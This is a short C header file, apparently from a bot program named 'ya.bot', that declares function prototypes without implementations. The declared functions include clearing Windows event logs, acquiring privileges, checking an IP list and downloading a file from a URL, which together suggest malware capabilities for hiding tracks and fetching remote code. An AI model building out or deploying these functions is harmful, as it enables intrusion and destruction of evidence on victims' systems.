/*  ya.bot  */

bool checkiplist();

#ifndef NO_CLEARLOGS
void cleareventlogs();
#endif

bool getprivileges();
__int64 getuptime();
void *memmem(const void *buf, const void *pattern, size_t buflen, size_t len);
char *stristr(const char *str, const char *strSearch);
bool wcstrcmp(char *s, char *w);
HRESULT xURLDownloadToFile(char *pszURL, char *pszFileName);